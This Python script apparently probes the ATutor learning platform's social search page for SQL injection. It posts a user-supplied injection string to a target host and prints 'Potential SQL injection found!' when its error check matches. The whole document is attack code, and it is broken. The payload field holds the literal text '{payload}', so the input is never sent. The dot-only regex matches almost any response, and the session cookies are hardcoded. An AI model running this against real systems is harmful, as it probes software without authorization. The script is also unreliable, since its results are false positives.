import sys
import re
import requests
from bs4 import BeautifulSoup

def Inject(ip, payload):
	
	# construct the target url

    url = f'http://{ip}/ATutor/mods/_standard/social/index_public.php'

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en,en-US;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://localhost',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost/ATutor/mods/_standard/social/index_public.php',
        'Cookie': 'ATutorID=o5ne1dsouer2mm1o6e3ro1qu06; Idea-f639c84f=9b69e1df-2e98-4f37-a8b2-3a3bfd508ed4; io=tmdLAcGe630Y8nJvAAAA; PHPSESSID=ldp5tsfsbkr8j2umkvfk39p2d3; flash=no',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Priority': 'u=0, i'
    }

    data = {
        'search_friends_4fd27a423c43c9c8843d2232d774367b': '{payload}',
        'search': 'Search',
        'rand_key': '4fd27a423c43c9c8843d2232d774367b'
    }

    r = requests.post(url, headers=headers, data=data)
    s = BeautifulSoup(r.text, 'lxml')

    print("[*] Header: ", r.headers)
    print("[*] Body: ", s.text.replace("\n\n", "")) #s.text.lstrip("\n"))

	# identify a response with an error
    error = re.search("..................", s.text)

    if error:
        print("[+] Potential SQL injection found!")
    else:
        print("[-] No errors found")
	
def main():
	if len(sys.argv) != 3:
		print("[*] usage: %s <target> <injection_str>" % sys.argv[0])
		print('[*] eg: %s 127.0.0.1 "AAA\'" ' % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	injection_str = sys.argv[2]

	Inject(ip, injection_str)

if __name__ == "__main__": 
	main()
